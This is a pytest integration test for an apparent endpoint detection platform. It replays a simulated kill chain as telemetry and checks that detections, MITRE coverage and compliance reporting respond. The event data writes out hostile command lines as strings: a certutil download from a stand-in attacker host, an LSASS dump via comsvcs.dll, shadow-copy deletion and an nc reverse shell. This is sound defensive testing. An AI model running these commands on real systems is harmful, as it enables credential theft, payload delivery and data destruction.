"""End-to-end attack simulation (quality gate).

Drives a realistic multi-stage intrusion — the full ATT&CK kill chain — through
the entire pipeline (agent enrol → telemetry ingestion → detection engine →
triage → analytics → compliance) and asserts the chain is detected end to end.
This is the "realistic attack simulation" integration test: it exercises the
built-in rules, the custom-monitor server rules (registry/YARA/Suricata/tamper),
a user-supplied Sigma rule, and the triage + compliance surfaces together.
"""
import pytest

from app.services import auth_service
from tests.conftest import ADMIN_HEADERS

SIGMA_RULE = """
title: Custom LSASS Dump via comsvcs
id: custom-lsass-1
level: critical
tags: [attack.credential-access, attack.t1003.001]
detection:
  sel:
    CommandLine|contains:
      - 'comsvcs.dll, MiniDump'
  condition: sel
"""


@pytest.fixture(autouse=True)
def _reset_rate_limit():
    auth_service.reset_rate_limit()
    yield
    auth_service.reset_rate_limit()


def _events():
    """A staged intrusion, one event per kill-chain step."""
    return [
        # 1. Execution — malicious PowerShell (encoded download cradle).
        {"source": "process", "action": "exec", "severity": "info",
         "summary": "Process started: powershell",
         "details": {"pid": 1001, "ppid": 500, "name": "powershell",
                     "command_line": "powershell -nop -w hidden -enc SQBFAFgAIAAo"}},
        # 2. Execution — LOLBin proxy download (certutil).
        {"source": "process", "action": "exec", "severity": "info",
         "summary": "Process started: certutil",
         "details": {"pid": 1002, "ppid": 1001, "name": "certutil",
                     "command_line": "certutil.exe -urlcache -f http://evil.example/x.exe c:\\x.exe"}},
        # 3. Credential access — Mimikatz.
        {"source": "process", "action": "exec", "severity": "info",
         "summary": "Process started: rundll32",
         "details": {"pid": 1003, "ppid": 1001, "name": "rundll32",
                     "command_line": "rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump 700 lsass.dmp full"}},
        # 4. Persistence — a new Run-key autorun (registry monitor).
        {"source": "registry_monitor", "action": "autorun_added", "severity": "warning",
         "summary": r"Registry autorun added: HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Updater -> C:\temp\evil.exe",
         "details": {"key": r"HKCU\...\CurrentVersion\Run", "name": "Updater",
                     "command_line": r"C:\temp\evil.exe"}},
        # 5. Command & control — Suricata IDS alert.
        {"source": "suricata", "action": "alert", "severity": "warning",
         "summary": "Suricata alert: ET MALWARE Cobalt Strike Beacon",
         "details": {"signature": "ET MALWARE Cobalt Strike Beacon", "signature_id": 2028,
                     "src_ip": "10.0.0.5", "dest_ip": "45.9.1.2"}},
        # 6. Malware on disk — YARA match.
        {"source": "yara", "action": "quarantined", "severity": "critical",
         "summary": "YARA rule CobaltStrike_Beacon matched beacon.dll",
         "details": {"path": "C:\\temp\\beacon.dll", "rules": ["CobaltStrike_Beacon"]}},
        # 7. Defense evasion — agent tamper attempt.
        {"source": "agent", "action": "tamper", "severity": "critical",
         "summary": "Agent state file integrity check failed",
         "details": {"device_id": "victim-01"}},
        # 8. Impact — ransomware recovery inhibition.
        {"source": "process", "action": "exec", "severity": "info",
         "summary": "Process started: vssadmin",
         "details": {"pid": 1008, "ppid": 1001, "name": "vssadmin",
                     "command_line": "vssadmin.exe delete shadows /all /quiet"}},
        # 9. Reverse shell terminated by the watchdog.
        {"source": "port_watchdog", "action": "killed", "severity": "critical",
         "summary": "killed reverse shell", "details": {"port": 4444, "process": "nc"}},
    ]


def test_full_killchain_is_detected_end_to_end(client, enrolled_device):
    # A SOC-supplied Sigma rule augments the built-ins.
    assert client.post("/api/admin/intel/rules", headers=ADMIN_HEADERS, json={
        "kind": "sigma", "name": "custom-lsass", "content": SIGMA_RULE, "enabled": True,
    }).status_code == 201

    resp = client.post("/api/agent/telemetry", json={"events": _events()},
                       headers=enrolled_device["headers"])
    assert resp.status_code == 200
    assert resp.json()["detections"] >= 9

    dets = client.get("/api/admin/detections", headers=ADMIN_HEADERS).json()
    fired = {d["rule_id"] for d in dets}

    # Every kill-chain stage produced its detection.
    expected = {
        "powershell_abuse", "encoded_command", "lolbin_execution",
        "credential_dumping", "registry_persistence", "suricata_alert",
        "yara_match", "tamper_detected", "ransomware_behavior", "reverse_shell",
        "sigma:custom-lsass-1",
    }
    missing = expected - fired
    assert not missing, f"kill-chain stages not detected: {missing}"


def test_killchain_mitre_coverage_spans_multiple_tactics(client, enrolled_device):
    client.post("/api/agent/telemetry", json={"events": _events()},
                headers=enrolled_device["headers"])
    coverage = client.get("/api/admin/analytics/mitre-coverage", headers=ADMIN_HEADERS).json()
    techniques = {c["technique_id"] for c in coverage}
    # Execution, credential access, persistence, C2, evasion, impact all represented.
    for tid in ("T1059", "T1218", "T1003", "T1547.001", "T1071", "T1562.001", "T1490"):
        assert any(t.startswith(tid) for t in techniques), f"missing technique {tid}"


def test_killchain_triage_and_compliance(client, enrolled_device):
    client.post("/api/agent/telemetry", json={"events": _events()},
                headers=enrolled_device["headers"])

    # Compliance report shows the critical backlog opened by the attack.
    report = client.get("/api/admin/analytics/compliance-report", headers=ADMIN_HEADERS).json()
    assert report["detections"]["open_critical"] > 0
    backlog = next(c for c in report["controls"] if c["id"] == "critical_backlog")
    assert backlog["status"] == "fail"

    # Analyst triages every detection to resolution.
    dets = client.get("/api/admin/detections", headers=ADMIN_HEADERS).json()
    for d in dets:
        assert client.post(f"/api/admin/detections/{d['id']}/ack",
                           headers=ADMIN_HEADERS).status_code == 200
        assert client.post(f"/api/admin/detections/{d['id']}/resolve",
                           headers=ADMIN_HEADERS).status_code == 200

    # Backlog clears once everything is resolved.
    report = client.get("/api/admin/analytics/compliance-report", headers=ADMIN_HEADERS).json()
    assert report["detections"]["open_critical"] == 0
    backlog = next(c for c in report["controls"] if c["id"] == "critical_backlog")
    assert backlog["status"] == "pass"
